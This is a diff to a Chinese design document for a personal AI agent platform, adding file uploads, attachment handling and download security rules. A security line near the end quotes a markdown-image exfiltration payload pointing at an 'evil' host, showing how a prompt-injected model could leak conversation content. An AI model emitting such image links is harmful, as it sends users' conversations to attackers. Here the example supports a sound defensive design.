@@ -16,6 +16,7 @@
 | Memory | agent 私有记忆，一份有长度上限的 markdown | `resources/agents/<id>/MEMORY.md` |
 | MCP server | agent 私有或公共的 MCP 连接配置，可引用 vault | `resources/{public,agents/<id>}/mcp/<name>.json` |
 | Secret | 加密保存的密码/token，通过 key 引用；公共或 agent 私有 | `secrets` 表（Fernet 加密） |
+| File | 对话里出现的文件：用户随消息发送的图片与附件、agent 用 `share_file` 发出的文件。写入后不可变，按 id 引用，引用形式唯一（`/api/files/<id>/<名称>`）；与消息相互独立，删除会话不删文件 | `files` 表（元数据）；内容按 sha256 存在 `data/files/` |
 | Trigger | 具名、持久的事件来源，把外部刺激变成交给某个 agent 的一轮；触发方式（定时、webhook……）多态实现 | `triggers` 表 |
 
 目录：
@@ -24,6 +25,8 @@
 data/
   muliao.db
   vapid_private.pem            # Web Push 密钥，首次启动生成
+  files/<sha前两位>/<sha256>   # 对话里的文件内容（元数据在 files 表），相同内容只存一份
+  files/tmp/                   # 上传中的临时文件，启动时清空
   resources/                   # git 仓库：agent 能改的文本资源，每次修改提交一版（见 muliao.resources）
     public/
       PROMPT.md                # 公共 prompt（合并进所有 agent）
@@ -97,7 +100,7 @@ Web / 触发器（定时、webhook……）/ delegate_task
 - **instructions** = 公共 prompt + agent 自身指令 + 运行上下文（agent 名、工作目录、当前时间、session 来源）+ memory 全文 + skill 索引（名称、描述、作用域）+ 自我进化守则。
 - **toolsets**（每个领域一个模块，在 `runtime/tools/` 下）。对话里开放哪些由 agent 的 `tool_groups` 决定（`runtime.runner.ToolGroups`，名称在组合根 `TOOL_GROUPS` 唯一声明）：`workspace`、`temp_agent`、`delegation`、`notify`、`agents`、`public_skills`（写公共 skill）、`mcp`（使用 MCP server）、`mcp_admin`（管理 MCP）、`vault`、`triggers`、`web`（只在配置了 `[web]` 时存在）；私有 skill、memory 与自己的指令（自我改进）总是开放，读公共 skill 也总是可以。反思只开放自我改进，以及该 agent 本来就有的 `public_skills`。新建 agent 默认全部开放；处理不可信输入（外部事件、网页内容）的 agent 应只开放需要的组，限制提示注入能造成的后果。临时 agent 有固定的工具集（文件与 shell，加上调用方可见的 MCP 与配置了的网页搜索，不看调用方是否选了 `mcp`；`temp_agent` 本来就等同于全部权限），不受 `tool_groups` 影响：
   - 局部修改（`update_agent`、`trigger_update`）由领域服务在一个事务里读取并只改给出的字段，工具层不读后整体写回：同一响应里并行的多个修改、以及用户在界面上的同时修改互不覆盖。面向模型的错误信息只带名称，不带 id。
-  - `workspace`：`read_file` / `write_file` / `edit_file` / `list_files` / `run_shell`（cwd = 工作目录，最小环境变量，可按 key 注入 secret，输出中的 secret 明文被替换为 `[secret:KEY]`）。不做强隔离——按需求为单人本机使用。
+  - `workspace`：`read_file` / `write_file` / `edit_file` / `list_files` / `share_file`（把文件发给用户，见第 4 节「附件与文件」）/ `run_shell`（cwd = 工作目录，最小环境变量，可按 key 注入 secret，输出中的 secret 明文被替换为 `[secret:KEY]`）。不做强隔离——按需求为单人本机使用。
   - `skills`：`read_skill`（私有或公共）/ `write_skill` / `delete_skill`（只限私有）；写公共 skill 在 `public_skills` 组：`write_public_skill` / `delete_public_skill`。
   - `memory`：`memory_append` / `memory_replace`，超长时 `ModelRetry` 要求先精简。
   - `instructions`：`instructions_replace`（改自己的指令：替换恰好出现一次的片段，或追加），每次修改记一版、作者是自己。
@@ -127,6 +130,16 @@ agent 之间的委派有两种形态，都是「对某个 thread 发起一轮」
 - **`ask_agent` 在调用方这一轮里直接跑完**（`TurnRunner.run_inline`）：与队列里的 turn 用同一个回合执行器（组装上下文、运行、在一个事务里提交消息、计数、压缩），提交时补记一条已完成的 turn task，所以「每一轮都是一个 task」在两条路径上都成立。私有 thread 不进队列（用户不能插话），同一 thread 的并行 ask 由进程内的锁串行。同一响应里对不同 thread 的多次 ask 并行执行；嵌套 ask（子 agent 再 ask）在同一调用链里依次完成。
 - **用最终正确性换简化**：内联运行不做持久化挂起。换掉的是「等待期间不占 worker、进程重启后从等待处继续」；换来的是没有等待表、挂起状态、恢复与回滚逻辑，队列里的 turn 与 ask_agent 共用同一个回合执行器，临时 agent 也走同一个运行入口（`AgentRuntime._execute`）。三条判据：失败可见——子 agent 的一轮失败直接作为调用方这一轮的失败（暂时性失败整轮重试，其余进入 failed 可人工重试）；可收敛——一轮是原子的，失败或崩溃时子 thread 不留半截记录，调用方这一轮按队列语义重放即可；代价可控——等待期间占用调用方的 worker 槽位和任务总时限，嵌套越深越耗时；调用方这一轮跨多个子 thread 时并不原子：已完成并提交的子轮次（同一响应里先答完的那个 ask、嵌套里先完成的孙一层）不会随调用方失败而撤销，重放时子 thread 会多一轮同样的问答（子 agent 能看到上一次的回答），子 agent 的工具副作用也会重复，反思计数会多计。个人助手可接受。
 - **删除**：删除父 session 会一并删除它的私有 thread（逐层）；用户可见的 thread 保留（`parent_session_id` 置空）。有任务正在运行时拒绝删除。私有 thread 的内联轮次不留 running 记录，所以判断它是否在跑看承载它的、走队列的祖先会话：祖先在跑任何一轮就拒绝删除这个私有 thread（单独删除，或删除它的 agent 时）。偏保守，但不需要额外状态。
+
+### 附件与文件
+
+做法同主流 IM 的媒体仓库（Matrix media repository、Slack files）：先上传得到 id，消息里只放引用。
+
+- **上传**：`POST /api/files?name=<名称>`，请求体就是文件内容，`Content-Type` 是它的类型（同 Matrix `/media/upload`，不用 multipart），边读边写边算 sha256，超过 `runtime.upload_max_bytes`（默认 50MB）立即停止。名称必须是单个路径段，不合法直接拒绝，不做修正。发消息时 `attachments` 带上 id（可以只有附件没有文字），`conversation.receive` 校验它们存在，写进 turn task 的 payload。
+- **在消息里的两种形态**（`runtime/attachments.py`）：存储形态是 `UserPromptPart` 里的 `ImageUrl` / `DocumentUrl`，url 即文件引用，数据库、界面、重放都用它；每次模型请求前由 pydantic-ai 的 `before_model_request` 钩子（`AttachmentsForModel`）展开成模型形态：一段说明（名称、类型、大小、工作目录里的路径），可内联的图片（png/jpeg/gif/webp）再附上内容。展开只替换这一次请求的消息列表，持久化的历史不变，所以文件内容在数据库里没有副本。模型不支持图片时，provider 的报错让这一轮失败，不悄悄丢掉图片。
+- **交给工具**：每次执行这一轮都把附件复制到 agent 工作目录的 `uploads/<id>/<名称>`（重试时覆盖成原件），供文件工具与 shell 处理；这是派生副本，原件只在文件存储里。
+- **agent 发出文件**：`share_file(path)` 把工作目录里的文件存一份快照，返回 Markdown 引用（图片 `![名称](url)`，其他 `[名称](url)`），agent 把它写进回答。
+- **一致性**：内容先写临时文件再改名到最终位置，之后才插入元数据行；失败即上传失败，没有 id 就没有引用。中途被杀留下的临时文件由启动时 `FileStore.recover` 清掉；有内容没元数据的孤儿只占空间，访问不到，同样内容再上传时复用。
 
 ## 5. 上下文压缩
 
@@ -233,6 +246,8 @@ agent 私有、有长度上限（`memory_max_chars`），每轮全文注入 inst
 其他边界：
 
 - Web 与 API：单用户密码登录（至少 8 位），HMAC 签名 cookie（密钥至少 32 位），有效期 90 天。登录接口未做频率限制，部署在公网时应在反向代理层限流。
+- 文件下载：与界面同源、带着登录 cookie，内容按不可信处理（agent 能写任意 HTML/SVG）。响应一律带 `X-Content-Type-Options: nosniff` 与 `Content-Security-Policy: sandbox`，只有 png/jpeg/gif/webp 按 inline 返回，其余一律 `Content-Disposition: attachment`，不在本站执行（同 Matrix 媒体下载）。
+- 回答里的图片：前端只渲染指向 `/api/files/` 的图片，外链图片显示为普通链接。否则被注入的模型输出 `![](https://evil/?d=<对话内容>)`，打开会话时浏览器就会自动把数据发出去。
 - Vault：Fernet 加密，主密钥来自配置 `vault.key`，缺失或格式错误时拒绝启动。
 - 配置文件：唯一配置来源（`config.example.toml`），未知键直接报错，避免拼写错误被静默忽略。
 - 日志不打印 secret 值与 token。
